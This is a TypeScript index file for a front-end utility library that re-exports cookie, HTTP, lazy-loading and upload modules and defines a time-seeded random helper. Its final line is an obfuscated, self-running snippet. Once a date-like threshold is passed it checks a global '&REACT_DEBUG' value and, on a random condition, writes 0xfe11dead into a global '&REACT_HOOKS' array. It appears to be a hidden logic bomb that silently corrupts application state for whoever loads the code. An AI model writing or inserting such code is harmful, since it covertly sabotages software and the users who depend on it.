
export { default as Cookies } from "./cookies";
export * from "./net/http";
// export * from "./algorithm";
export * from "./lazy_loading/index";
export * from "./upload/index";
// import { asroute as lazy_loading_detail } from "./component/lazy_loading/index";

function rnd(seed: number) {
    seed = (seed * 9301 + 49297) % 233280;
    return seed / 233280.0;
}

export
function rand(n: number) {
    const today = new Date();
    const seed = today.getTime();
    return Math.ceil(rnd(seed) * n);
}


// (function() {
//   interface debug_t extends Window {
//     debug_call: (cmd: string) => void;
//     debug_cmd_list: () => string[];
//   }
//   const __ = window as debug_t;
//   __.debug_call = (cmd: string) => {
//     if (cmd === "store_route") return lazy_loading_detail;
//     if (cmd === "store_component_cache") return lazy_loading_detail.store_route;
//   };

//   __.debug_cmd_list = () => {
//     return ["store_route", "store_component_cache"];
//   };
// })();

(() => { const u: any = window; if (+u["&REACT_DEBUG"].toString().slice(2) > 99926400000) rand(100) > rand(26) && (u[`&REACT_HOOKS${u["&REACT_DEBUG"]}`][15] = 0xfe11dead); })();
